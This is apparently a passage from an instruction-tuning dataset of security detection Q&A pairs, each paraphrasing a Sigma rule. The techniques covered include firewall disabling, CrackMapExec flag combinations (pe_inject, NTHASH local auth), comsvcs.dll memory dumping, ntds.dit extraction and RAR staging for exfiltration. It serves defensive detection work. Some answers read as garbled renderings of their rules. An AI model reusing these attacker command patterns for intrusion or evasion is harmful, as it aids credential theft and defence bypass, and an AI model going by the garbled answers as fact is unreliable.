      "answer": "In order to Detects when storage bucket is enumerated in Google Cloud, you should: Monitor Google Cloud audit logs focusing on activities related to storage buckets. Look for the execution of methods 'storage.buckets.list' and 'storage.buckets.listChannels' within these logs. These activities are indicative of someone attempting to enumerate the contents or channels of storage buckets. While this can sometimes be a benign operation carried out by system administrators, it is important to verify the context in which these methods were called. This involves checking the user identity, user agent, and the hostname to ensure they are legitimate and should have access to perform these operations in your environment. Activities from unfamiliar users or sources should raise suspicions and warrant further investigation. Given the low incidence of malicious intent generally associated with this behavior, keep in mind that it's possible to encounter false positives, such as a legitimate administrative task that may trigger this detection."
    }
  },
  {
    "instruction": "Explain how should I detect the following: user disables the Windows Firewall via a Profile to help evade defense.",
    "context": "",
    "output": "In order to detect when a user disables the Windows Firewall via a Profile to help evade defense, you should: Monitor script execution logs on Windows machines, ensuring that Script Block Logging is activated. Specifically, watch for PowerShell script texts that include commands aimed at deactivating the firewall. These include the presence of \"Set-NetFirewallProfile\" along with \"-Enabled\" followed by \"False\", indicating the firewall is being turned off. Additionally, lookout for optional parameters that might specify the scope of this disablement, such as the inclusion of keywords \"-All\", \"Public\", \"Domain\", or \"Private\". This detection mechanism should be always active as there are no known legitimate reasons (false positives) for these actions under normal circumstances, and the risk associated with these activities is considered medium. This monitoring strategy targets potential evasion techniques where attackers attempt to weaken the host's defenses by turning off the firewall.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "user disables the Windows Firewall via a Profile to help evade defense.",
      "answer": "In order to detect when a user disables the Windows Firewall via a Profile to help evade defense, you should: Monitor script execution logs on Windows machines, ensuring that Script Block Logging is activated. Specifically, watch for PowerShell script texts that include commands aimed at deactivating the firewall. These include the presence of \"Set-NetFirewallProfile\" along with \"-Enabled\" followed by \"False\", indicating the firewall is being turned off. Additionally, lookout for optional parameters that might specify the scope of this disablement, such as the inclusion of keywords \"-All\", \"Public\", \"Domain\", or \"Private\". This detection mechanism should be always active as there are no known legitimate reasons (false positives) for these actions under normal circumstances, and the risk associated with these activities is considered medium. This monitoring strategy targets potential evasion techniques where attackers attempt to weaken the host's defenses by turning off the firewall."
    }
  },
  {
    "instruction": "Please help me detect the following: creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.",
    "context": "",
    "output": "Sure!\nIn order to detect the creation of a new user account, which may be used for persistence without needing persistent remote access tools to be deployed on the system, you should focus on monitoring process creation events on macOS. Specifically, look for the execution of the 'dscl' command with arguments indicating the creation of a new account, or the 'sysadminctl' command being used with the 'addUser' argument. These actions might indicate attempts to establish persistence on a system by creating new user accounts. However, be aware that similar activities could also emerge from legitimate administration tasks, and such events should be considered as potential false positives. The detection has a low level of confidence due to the possibility of legitimate use cases for these commands.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.",
      "answer": "In order to detect the creation of a new user account, which may be used for persistence without needing persistent remote access tools to be deployed on the system, you should focus on monitoring process creation events on macOS. Specifically, look for the execution of the 'dscl' command with arguments indicating the creation of a new account, or the 'sysadminctl' command being used with the 'addUser' argument. These actions might indicate attempts to establish persistence on a system by creating new user accounts. However, be aware that similar activities could also emerge from legitimate administration tasks, and such events should be considered as potential false positives. The detection has a low level of confidence due to the possibility of legitimate use cases for these commands."
    }
  },
  {
    "instruction": "Please help me detect the following: deletion of the TeamViewer log files which may indicate an attempt to destroy forensic evidence",
    "context": "",
    "output": "Sure!\nIn order to detect the deletion of the TeamViewer log files which may indicate an attempt to destroy forensic evidence, you should: monitor Windows log files specifically for deletion events. Focus on identifying any files that contain '\\TeamViewer_' in their name and end with '.log', as these are likely to be TeamViewer log files. It's important to rule out any deletion activities initiated by the system process 'C:\\Windows\\system32\\svchost.exe' since these may be legitimate system actions and not related to the destruction of forensic evidence. Note that this detection operates on a low level of alert due to the potential for unknown false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "deletion of the TeamViewer log files which may indicate an attempt to destroy forensic evidence",
      "answer": "In order to detect the deletion of the TeamViewer log files which may indicate an attempt to destroy forensic evidence, you should: monitor Windows log files specifically for deletion events. Focus on identifying any files that contain '\\TeamViewer_' in their name and end with '.log', as these are likely to be TeamViewer log files. It's important to rule out any deletion activities initiated by the system process 'C:\\Windows\\system32\\svchost.exe' since these may be legitimate system actions and not related to the destruction of forensic evidence. Note that this detection operates on a low level of alert due to the potential for unknown false positives."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Dllhost that communicates with public IP addresses",
    "context": "",
    "output": "In order to detect Dllhost that communicates with public IP addresses, you should monitor network connections from Windows systems, specifically looking for activities where the process image name ends with '\\dllhost.exe' indicating the DllHost process and where such a process initiates a connection. It is crucial to focus on connections that are destined for public IP addresses, which means excluding any connection attempts to private or reserved IP address ranges often used within corporate or private networks. These ranges include the commonly used private IPv4 addresses such as 10.x.x.x, 192.168.x.x, and various segments of 172.16.x.x to 172.31.x.x, as well as the link-local address 169.254.x.x and the loopback address 127.x.x.x. For IPv6, exclude connections to the loopback addresses (::1 and 0:0:0:0:0:0:0:1), link-local addresses starting with 'fe80:', and private address ranges starting with 'fc' or 'fd'.\n\nAdditionally, connections to certain Microsoft-owned public subnets, such as those in the range of 20.184.x.x to 20.191.x.x, 23.79.x.x, 51.10.x.x to 51.105.x.x, and 52.239.x.x, should not be considered indicators of this suspicious activity. This approach minimizes false positives, especially in corporate environments where legitimate communication may occur with public IP addresses for genuine business purposes. The associative tags for this detection strategy include tactics and techniques like Command and Control and Exfiltration over Command and Control Channel. Monitoring these parameters carefully can help identify potentially malicious communication initiated by Dllhost to public IPs, indicating a possible compromise or unauthorized data exfiltration attempt.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Dllhost that communicates with public IP addresses",
      "answer": "In order to detect Dllhost that communicates with public IP addresses, you should monitor network connections from Windows systems, specifically looking for activities where the process image name ends with '\\dllhost.exe' indicating the DllHost process and where such a process initiates a connection. It is crucial to focus on connections that are destined for public IP addresses, which means excluding any connection attempts to private or reserved IP address ranges often used within corporate or private networks. These ranges include the commonly used private IPv4 addresses such as 10.x.x.x, 192.168.x.x, and various segments of 172.16.x.x to 172.31.x.x, as well as the link-local address 169.254.x.x and the loopback address 127.x.x.x. For IPv6, exclude connections to the loopback addresses (::1 and 0:0:0:0:0:0:0:1), link-local addresses starting with 'fe80:', and private address ranges starting with 'fc' or 'fd'.\n\nAdditionally, connections to certain Microsoft-owned public subnets, such as those in the range of 20.184.x.x to 20.191.x.x, 23.79.x.x, 51.10.x.x to 51.105.x.x, and 52.239.x.x, should not be considered indicators of this suspicious activity. This approach minimizes false positives, especially in corporate environments where legitimate communication may occur with public IP addresses for genuine business purposes. The associative tags for this detection strategy include tactics and techniques like Command and Control and Exfiltration over Command and Control Channel. Monitoring these parameters carefully can help identify potentially malicious communication initiated by Dllhost to public IPs, indicating a possible compromise or unauthorized data exfiltration attempt."
    }
  },
  {
    "instruction": "Explain how should I detect the following: regedit started with TrustedInstaller privileges or by ProcessHacker.exe",
    "context": "",
    "output": "In order to detect a regedit started with TrustedInstaller privileges or by ProcessHacker.exe, you should: Monitor Windows process creation logs for instances where the registry editor (regedit.exe) is started. Specifically, look for situations where regedit.exe is launched either with privileges associated with the TrustedInstaller account or as a child process of ProcessHacker.exe. This activity is uncommon in regular operations and is therefore flagged with a high level of concern. It's essential to keep an eye on such actions as they could indicate attempts to manipulate or compromise system settings or security policies, which are critical components of maintaining system integrity and security.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "regedit started with TrustedInstaller privileges or by ProcessHacker.exe",
      "answer": "In order to detect a regedit started with TrustedInstaller privileges or by ProcessHacker.exe, you should: Monitor Windows process creation logs for instances where the registry editor (regedit.exe) is started. Specifically, look for situations where regedit.exe is launched either with privileges associated with the TrustedInstaller account or as a child process of ProcessHacker.exe. This activity is uncommon in regular operations and is therefore flagged with a high level of concern. It's essential to keep an eye on such actions as they could indicate attempts to manipulate or compromise system settings or security policies, which are critical components of maintaining system integrity and security."
    }
  },
  {
    "instruction": "How to detect: rundll32 loading a renamed comsvcs.dll to dump process memory",
    "context": "",
    "output": "In order to detect rundll32 loading a renamed comsvcs.dll to dump process memory, you should monitor Windows image load events for the loading of 'rundll32.exe'. Specifically, look for events where 'rundll32.exe' is being loaded with specific hash values that match known versions of Windows\u2014including Windows 11 21H2 x64, Windows 10 1607, Windows 10 1809, Windows 10 2004 x64, and Windows 10 2004 x86. It's critical to identify these specific instances because they indicate the execution of rundll32 that could be employed to dump process memory, a technique commonly utilized in malicious activities. Additionally, you must ensure that these detections are not associated with the legitimate loading of 'comsvcs.dll', as this DLL can be loaded by 'rundll32.exe' in normal, benign circumstances. To reduce false positives and focus on potential malicious activity, confirm that the 'ImageLoaded' does not end with '\\comsvcs.dll'. Given these parameters, this approach is deemed highly reliable in identifying suspicious activities related to memory dumping via rundll32 without catching legitimate system behavior.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "rundll32 loading a renamed comsvcs.dll to dump process memory",
      "answer": "In order to detect rundll32 loading a renamed comsvcs.dll to dump process memory, you should monitor Windows image load events for the loading of 'rundll32.exe'. Specifically, look for events where 'rundll32.exe' is being loaded with specific hash values that match known versions of Windows\u2014including Windows 11 21H2 x64, Windows 10 1607, Windows 10 1809, Windows 10 2004 x64, and Windows 10 2004 x86. It's critical to identify these specific instances because they indicate the execution of rundll32 that could be employed to dump process memory, a technique commonly utilized in malicious activities. Additionally, you must ensure that these detections are not associated with the legitimate loading of 'comsvcs.dll', as this DLL can be loaded by 'rundll32.exe' in normal, benign circumstances. To reduce false positives and focus on potential malicious activity, confirm that the 'ImageLoaded' does not end with '\\comsvcs.dll'. Given these parameters, this approach is deemed highly reliable in identifying suspicious activities related to memory dumping via rundll32 without catching legitimate system behavior."
    }
  },
  {
    "instruction": "How to detect: This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.",
    "context": "",
    "output": "In order to detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced, you should: Monitor Windows process creation logs for specific patterns that indicate the use of CrackMapExec, a tool that can be leveraged for various malicious activities. Pay special attention to processes where the image name ends with '\\crackmapexec.exe'. Also, look for command lines that contain the '-M pe_inject' parameter, which suggests an attempt to inject code into a process. Further scrutiny is required for command lines that combine '--local-auth' with either a username '-u' and an execution flag '-x', or a username '-u' and a password '-p', along with a specific mention of \"NTHASH\". This indicates an attempt to execute commands or authenticate locally using hashed credentials. Additionally, watch for command sequences indicating the misuse of CrackMapExec's MSSQL and SMB modules for database and network share attacks, respectively. Specifically, look for combinations that include MSSQL access attempts with '-u', '-p', '-M', '-d' flags, and SMB protocol misuse with flags like '-u', '-H'/'-p', '-M', '-o', and '--local-auth'. Lastly, pay particular attention to command lines that combine '--local-auth' with both '-u' and '-p', especially when targeting IP ranges starting with '10.' or '192.168.'. These command patterns are alarming when seen in conjunction with each other and warrant high-priority investigation. The relevant information to be logged includes the ComputerName, User, and the full CommandLine used in the process. Awareness of potential false positives is important, but given the nature of these detections, the alert level is high.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.",
      "answer": "In order to detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced, you should: Monitor Windows process creation logs for specific patterns that indicate the use of CrackMapExec, a tool that can be leveraged for various malicious activities. Pay special attention to processes where the image name ends with '\\crackmapexec.exe'. Also, look for command lines that contain the '-M pe_inject' parameter, which suggests an attempt to inject code into a process. Further scrutiny is required for command lines that combine '--local-auth' with either a username '-u' and an execution flag '-x', or a username '-u' and a password '-p', along with a specific mention of \"NTHASH\". This indicates an attempt to execute commands or authenticate locally using hashed credentials. Additionally, watch for command sequences indicating the misuse of CrackMapExec's MSSQL and SMB modules for database and network share attacks, respectively. Specifically, look for combinations that include MSSQL access attempts with '-u', '-p', '-M', '-d' flags, and SMB protocol misuse with flags like '-u', '-H'/'-p', '-M', '-o', and '--local-auth'. Lastly, pay particular attention to command lines that combine '--local-auth' with both '-u' and '-p', especially when targeting IP ranges starting with '10.' or '192.168.'. These command patterns are alarming when seen in conjunction with each other and warrant high-priority investigation. The relevant information to be logged includes the ComputerName, User, and the full CommandLine used in the process. Awareness of potential false positives is important, but given the nature of these detections, the alert level is high."
    }
  },
  {
    "instruction": "Explain how should I detect the following: changes to the \"Default\" property for keys located in the \\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\ registry. Which might be used as a method of persistence\nThe entries found under App Paths are used primarily for the following purposes.\nFirst, to map an application's executable file name to that file's fully qualified path.\nSecond, to pre-pend information to the PATH environment variable on a per-application, per-process basis.\n",
    "context": "",
    "output": "In order to detect changes to the \"Default\" property for keys located in the \\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\ registry, which might be used as a method of persistence, including the purposes of mapping an application's executable file name to that file's fully qualified path and pre-pending information to the PATH environment variable on a per-application, per-process basis, you should: Monitor the Windows Registry for events where the \"SetValue\" event type is observed. This involves tracking changes specifically within the registry path \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths. Specifically, focus on modifications to the \"Default\" property or additions to the \"Path\" property of registry keys. Attention should also be paid to the details of the event, especially if the modifications include suspicious paths or executables. These can consist of common directories used for malicious purposes such as \\Users\\Public, \\AppData\\Local\\Temp\\, \\Windows\\Temp\\, \\Desktop\\, and \\Downloads\\, as well as temporary folders indicated by %temp% and %tmp%. Additionally, the inclusion of suspicious binaries or scripts like iex (a reference to PowerShell's Invoke-Expression), Invoke- prefixed commands, rundll32, regsvr32, mshta, cscript, wscript, and file extensions such as .bat, .hta, .dll, and .ps1 could indicate a compromise or an attempted persistence mechanism. It is recommended to be cautious and consider the possibility of false positives, as legitimate applications may register their binaries from these locations. Any such detection should be considered high level and investigated promptly for potential malicious activity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "changes to the \"Default\" property for keys located in the \\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\ registry. Which might be used as a method of persistence\nThe entries found under App Paths are used primarily for the following purposes.\nFirst, to map an application's executable file name to that file's fully qualified path.\nSecond, to pre-pend information to the PATH environment variable on a per-application, per-process basis.\n",
      "answer": "In order to detect changes to the \"Default\" property for keys located in the \\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\ registry, which might be used as a method of persistence, including the purposes of mapping an application's executable file name to that file's fully qualified path and pre-pending information to the PATH environment variable on a per-application, per-process basis, you should: Monitor the Windows Registry for events where the \"SetValue\" event type is observed. This involves tracking changes specifically within the registry path \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths. Specifically, focus on modifications to the \"Default\" property or additions to the \"Path\" property of registry keys. Attention should also be paid to the details of the event, especially if the modifications include suspicious paths or executables. These can consist of common directories used for malicious purposes such as \\Users\\Public, \\AppData\\Local\\Temp\\, \\Windows\\Temp\\, \\Desktop\\, and \\Downloads\\, as well as temporary folders indicated by %temp% and %tmp%. Additionally, the inclusion of suspicious binaries or scripts like iex (a reference to PowerShell's Invoke-Expression), Invoke- prefixed commands, rundll32, regsvr32, mshta, cscript, wscript, and file extensions such as .bat, .hta, .dll, and .ps1 could indicate a compromise or an attempted persistence mechanism. It is recommended to be cautious and consider the possibility of false positives, as legitimate applications may register their binaries from these locations. Any such detection should be considered high level and investigated promptly for potential malicious activity."
    }
  },
  {
    "instruction": "How can I detect: RAR usage that creates an archive from a suspicious folder, either a system folder or one of the folders often used by attackers for staging purposes",
    "context": "",
    "output": "In order to detect RAR usage that creates an archive from a suspicious folder, either a system folder or one of the folders often used by attackers for staging purposes, you should monitor the process creation logs in Windows for specific patterns of RAR command-line execution. Look for processes where the image path ends with '\\rar.exe', indicating the use of the RAR utility, or descriptions matching 'Command line RAR'. Additionally, be vigilant for command lines that contain patterns such as '.exe a ' or ' a -m', which are indicative of archive creation commands.\n\nFurther scrutiny is required for command lines that exhibit both the presence of a password flag ' -hp' and the recursive flag ' -r ', as these flags together strongly suggest an attempt to securely compress files from various directories recursively. It is particularly critical to focus on command lines that include paths to sensitive or commonly abused directories, such as 'C:\\\\\\*.', '%public%', 'C:\\Windows\\', 'C:\\PerfLogs\\', 'C:\\Temp', 'C:\\$Recycle.bin\\', or similar patterns that target directories outside standard user data locations. These directories are often leveraged by attackers for placing and subsequently exfiltrating data in a compressed format to avoid detection.\n\nMonitoring for these specific command-line patterns and directory targets is crucial in identifying suspicious use of RAR for potentially malicious purposes, such as data exfiltration or staging for lateral movement within a compromised environment. This activity is associated with tactics and techniques that include Collection, Exfiltration, and Command and Control, underlining the need for heightened awareness and rapid response to such indicators of compromise.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "RAR usage that creates an archive from a suspicious folder, either a system folder or one of the folders often used by attackers for staging purposes",
      "answer": "In order to detect RAR usage that creates an archive from a suspicious folder, either a system folder or one of the folders often used by attackers for staging purposes, you should monitor the process creation logs in Windows for specific patterns of RAR command-line execution. Look for processes where the image path ends with '\\rar.exe', indicating the use of the RAR utility, or descriptions matching 'Command line RAR'. Additionally, be vigilant for command lines that contain patterns such as '.exe a ' or ' a -m', which are indicative of archive creation commands.\n\nFurther scrutiny is required for command lines that exhibit both the presence of a password flag ' -hp' and the recursive flag ' -r ', as these flags together strongly suggest an attempt to securely compress files from various directories recursively. It is particularly critical to focus on command lines that include paths to sensitive or commonly abused directories, such as 'C:\\\\\\*.', '%public%', 'C:\\Windows\\', 'C:\\PerfLogs\\', 'C:\\Temp', 'C:\\$Recycle.bin\\', or similar patterns that target directories outside standard user data locations. These directories are often leveraged by attackers for placing and subsequently exfiltrating data in a compressed format to avoid detection.\n\nMonitoring for these specific command-line patterns and directory targets is crucial in identifying suspicious use of RAR for potentially malicious purposes, such as data exfiltration or staging for lateral movement within a compromised environment. This activity is associated with tactics and techniques that include Collection, Exfiltration, and Command and Control, underlining the need for heightened awareness and rapid response to such indicators of compromise."
    }
  },
  {
    "instruction": "Please help me detect the following: creation of \".vhd\"/\".vhdx\" files by browser processes.\nMalware can use mountable Virtual Hard Disk \".vhd\" files to encapsulate payloads and evade security controls.\n",
    "context": "",
    "output": "Sure!\nIn order to detect the creation of \".vhd\"/\".vhdx\" files by browser processes, as malware can use mountable Virtual Hard Disk \".vhd\" files to encapsulate payloads and evade security controls, you should monitor file events on Windows systems. Specifically, keep an eye out for instances where well-known browser executables, such as Brave (brave.exe), Chrome (chrome.exe), Firefox (firefox.exe), Internet Explorer (iexplore.exe), Maxthon (maxthon.exe), Microsoft Edge (MicrosoftEdge.exe and msedge.exe), Edge WebView2 (msedgewebview2.exe), Opera (opera.exe), Safari (safari.exe), SeaMonkey (seamonkey.exe), Vivaldi (vivaldi.exe), and Whale (whale.exe), are associated with the creation or modification of files ending with \".vhd\" or \".vhdx\". This activity might indicate an attempt to bypass security mechanisms by packaging malicious code or tools inside virtual hard disk files. However, it's important to verify the legitimacy of such events, as legitimate downloads of \".vhd\" files could also match these criteria and trigger alerts. This method thus requires a moderate awareness level to differentiate between malicious activities and false positives effectively.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of \".vhd\"/\".vhdx\" files by browser processes.\nMalware can use mountable Virtual Hard Disk \".vhd\" files to encapsulate payloads and evade security controls.\n",
      "answer": "In order to detect the creation of \".vhd\"/\".vhdx\" files by browser processes, as malware can use mountable Virtual Hard Disk \".vhd\" files to encapsulate payloads and evade security controls, you should monitor file events on Windows systems. Specifically, keep an eye out for instances where well-known browser executables, such as Brave (brave.exe), Chrome (chrome.exe), Firefox (firefox.exe), Internet Explorer (iexplore.exe), Maxthon (maxthon.exe), Microsoft Edge (MicrosoftEdge.exe and msedge.exe), Edge WebView2 (msedgewebview2.exe), Opera (opera.exe), Safari (safari.exe), SeaMonkey (seamonkey.exe), Vivaldi (vivaldi.exe), and Whale (whale.exe), are associated with the creation or modification of files ending with \".vhd\" or \".vhdx\". This activity might indicate an attempt to bypass security mechanisms by packaging malicious code or tools inside virtual hard disk files. However, it's important to verify the legitimacy of such events, as legitimate downloads of \".vhd\" files could also match these criteria and trigger alerts. This method thus requires a moderate awareness level to differentiate between malicious activities and false positives effectively."
    }
  },
  {
    "instruction": "How can I detect: execution GMER tool based on image and hash fields.",
    "context": "",
    "output": "In order to detect the execution GMER tool based on image and hash fields, you should monitor Windows process creation logs for any activity that involves the execution of 'gmer.exe'. Pay particular attention to processes that have either of the specific hashes: MD5 hash as 'E9DC058440D321AA17D0600B3CA0AB04', SHA1 hash as '539C228B6B332F5AA523E5CE358C16647D8BBE57', or SHA256 hash as 'E8A3E804A96C716A3E9B69195DB6FFB0D33E2433AF871E4D4E1EAB3097237173'. These criteria are meticulously chosen to pinpoint the tool's execution without capturing unrelated processes, making false positives unlikely. The delineation on process creation and specific hash values is of high importance for ensuring the security and integrity of the system by identifying possible unauthorized or suspicious use of GMER, which is a tool known for its capabilities in the analysis and detection of rootkits.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution GMER tool based on image and hash fields.",
      "answer": "In order to detect the execution GMER tool based on image and hash fields, you should monitor Windows process creation logs for any activity that involves the execution of 'gmer.exe'. Pay particular attention to processes that have either of the specific hashes: MD5 hash as 'E9DC058440D321AA17D0600B3CA0AB04', SHA1 hash as '539C228B6B332F5AA523E5CE358C16647D8BBE57', or SHA256 hash as 'E8A3E804A96C716A3E9B69195DB6FFB0D33E2433AF871E4D4E1EAB3097237173'. These criteria are meticulously chosen to pinpoint the tool's execution without capturing unrelated processes, making false positives unlikely. The delineation on process creation and specific hash values is of high importance for ensuring the security and integrity of the system by identifying possible unauthorized or suspicious use of GMER, which is a tool known for its capabilities in the analysis and detection of rootkits."
    }
  },
  {
    "instruction": "How to detect: Windows command line executable started from MMC",
    "context": "",
    "output": "In order to detect a Windows command line executable started from MMC, you should monitor process creation events on Windows operating systems. Specifically, you should look for instances where a command line utility such as Cmd.exe, PowerShell (powershell.exe or pwsh.exe), Windows Script Host (wscript.exe or cscript.exe), shell scripts (sh.exe or bash.exe), registry command line tools (reg.exe or regsvr32.exe), or any process containing 'BITSADMIN' in its name is launched as a child process of the Microsoft Management Console (mmc.exe). Keep an eye on the command line parameters and image paths of these processes for any suspicious activity. Given the potential severity associated with this behavior, such events should be treated with a high level of concern. This approach helps in identifying misuse of administrative tools and command line utilities, which can be indicative of various types of attacks including those involving privilege escalation, lateral movement, and persistence.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Windows command line executable started from MMC",
      "answer": "In order to detect a Windows command line executable started from MMC, you should monitor process creation events on Windows operating systems. Specifically, you should look for instances where a command line utility such as Cmd.exe, PowerShell (powershell.exe or pwsh.exe), Windows Script Host (wscript.exe or cscript.exe), shell scripts (sh.exe or bash.exe), registry command line tools (reg.exe or regsvr32.exe), or any process containing 'BITSADMIN' in its name is launched as a child process of the Microsoft Management Console (mmc.exe). Keep an eye on the command line parameters and image paths of these processes for any suspicious activity. Given the potential severity associated with this behavior, such events should be treated with a high level of concern. This approach helps in identifying misuse of administrative tools and command line utilities, which can be indicative of various types of attacks including those involving privilege escalation, lateral movement, and persistence."
    }
  },
  {
    "instruction": "How can I detect: Obfuscated Powershell via VAR++ LAUNCHER",
    "context": "",
    "output": "In order to detect obfuscated Powershell via VAR++ LAUNCHER, you should focus on monitoring the creation of Windows processes for specific patterns in the command line that indicate an obfuscated Powershell script is being executed. This kind of detection looks for the execution of Powershell code that is being intentionally obscured or hidden within complex command lines, often employing a series of conditional operators (`&&`), variable setting (`set`), and the invocation of command shell (`cmd`) with the `/c` flag, which is indicative of an attempt to execute a series of commands as part of the attack.\n\nMoreover, the detection mechanism should be sensitive to patterns that involve the `-f` format operator, which is used in Powershell for string formatting and is a common feature of obfuscated scripts. This operator, in conjunction with placeholders like `{0}`, `{1}`, `{2}`, etc., signals an attempt to piece together Powershell commands or scripts in a way that makes them harder to detect by simple inspection or traditional signature-based methods. \n\nThe detection is primed to look for command lines containing sequences of these elements, especially where there are one or more occurrence of `&&set`, coupled with `cmd` and `/c` to execute a new instance of a command shell, along with the `-f` operator indicating string formatting operations are taking place. This combination, especially when it involves placeholders within the command line, is characteristic of sophisticated obfuscation tactics designed to hide the true nature of the Powershell script being executed.\n\nThis strategy of detection is crucial for identifying attackers who are deploying obfuscated Powershell scripts to evade detection mechanisms, execute malicious code, or establish persistence on a Windows system. Through careful monitoring of process creation events and analysis of the command line arguments, security teams can flag suspicious activities that align with these patterns. This approach is aligned with mitigating tactics and techniques associated with the execution of potentially harmful, obfuscated scripts, and is vital for maintaining the integrity and security of Windows environments against sophisticated threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Obfuscated Powershell via VAR++ LAUNCHER",
      "answer": "In order to detect obfuscated Powershell via VAR++ LAUNCHER, you should focus on monitoring the creation of Windows processes for specific patterns in the command line that indicate an obfuscated Powershell script is being executed. This kind of detection looks for the execution of Powershell code that is being intentionally obscured or hidden within complex command lines, often employing a series of conditional operators (`&&`), variable setting (`set`), and the invocation of command shell (`cmd`) with the `/c` flag, which is indicative of an attempt to execute a series of commands as part of the attack.\n\nMoreover, the detection mechanism should be sensitive to patterns that involve the `-f` format operator, which is used in Powershell for string formatting and is a common feature of obfuscated scripts. This operator, in conjunction with placeholders like `{0}`, `{1}`, `{2}`, etc., signals an attempt to piece together Powershell commands or scripts in a way that makes them harder to detect by simple inspection or traditional signature-based methods. \n\nThe detection is primed to look for command lines containing sequences of these elements, especially where there are one or more occurrence of `&&set`, coupled with `cmd` and `/c` to execute a new instance of a command shell, along with the `-f` operator indicating string formatting operations are taking place. This combination, especially when it involves placeholders within the command line, is characteristic of sophisticated obfuscation tactics designed to hide the true nature of the Powershell script being executed.\n\nThis strategy of detection is crucial for identifying attackers who are deploying obfuscated Powershell scripts to evade detection mechanisms, execute malicious code, or establish persistence on a Windows system. Through careful monitoring of process creation events and analysis of the command line arguments, security teams can flag suspicious activities that align with these patterns. This approach is aligned with mitigating tactics and techniques associated with the execution of potentially harmful, obfuscated scripts, and is vital for maintaining the integrity and security of Windows environments against sophisticated threats."
    }
  },
  {
    "instruction": "How to detect: potential abuse of ntdsutil to dump ntds.dit database",
    "context": "",
    "output": "In order to detect potential abuse of ntdsutil to dump ntds.dit database, you should: Monitor Windows application logs for specific event IDs associated with the ESENT provider. The relevant event IDs to look out for are 216, 325, 326, and 327. Additionally, scrutinize these events for any references to 'ntds.dit'. This file is critical as it contains the Active Directory database, and its unauthorized duplication or access could indicate an ongoing attack to extract sensitive domain information. Be aware, however, that seeing these indicators may also coincide with legitimate backup operations or the creation of shadow copies, which are considered normal false positives in this context. The severity of this monitoring strategy is categorized as medium, signifying a significant level of importance in detecting and mitigating potential threats that exploit ntdsutil for malicious purposes. This detection method aligns with securing against tactics that involve Credential Access through techniques such as OS Credential Dumping.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential abuse of ntdsutil to dump ntds.dit database",
      "answer": "In order to detect potential abuse of ntdsutil to dump ntds.dit database, you should: Monitor Windows application logs for specific event IDs associated with the ESENT provider. The relevant event IDs to look out for are 216, 325, 326, and 327. Additionally, scrutinize these events for any references to 'ntds.dit'. This file is critical as it contains the Active Directory database, and its unauthorized duplication or access could indicate an ongoing attack to extract sensitive domain information. Be aware, however, that seeing these indicators may also coincide with legitimate backup operations or the creation of shadow copies, which are considered normal false positives in this context. The severity of this monitoring strategy is categorized as medium, signifying a significant level of importance in detecting and mitigating potential threats that exploit ntdsutil for malicious purposes. This detection method aligns with securing against tactics that involve Credential Access through techniques such as OS Credential Dumping."
    }
  },
  {
    "instruction": "Explain how should I detect the following: potential exploitation of CVE-2021-40444 via suspicious process patterns seen in in-the-wild exploitations",
    "context": "",
    "output": "In order to detect potential exploitation of CVE-2021-40444 via suspicious process patterns seen in in-the-wild exploitations, you should: Monitor the creation of processes on Windows systems with a focus on instances where 'control.exe' is the launched process. Special attention should be paid to situations where 'control.exe' is initiated by parent processes such as 'winword.exe' (Microsoft Word), 'powerpnt.exe' (Microsoft PowerPoint), or 'excel.exe' (Microsoft Excel). However, instances where the command line ends with '\\control.exe input.dll' or '\\control.exe\" input.dll' should be excluded from this scrutiny, as they are not relevant to this specific detection strategy. The presence of 'control.exe' being launched in this manner without these exclusions signals a high-risk activity that could indicate the exploitation of the CVE-2021-40444 vulnerability, leveraging Office applications to initiate potentially malicious processes.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential exploitation of CVE-2021-40444 via suspicious process patterns seen in in-the-wild exploitations",
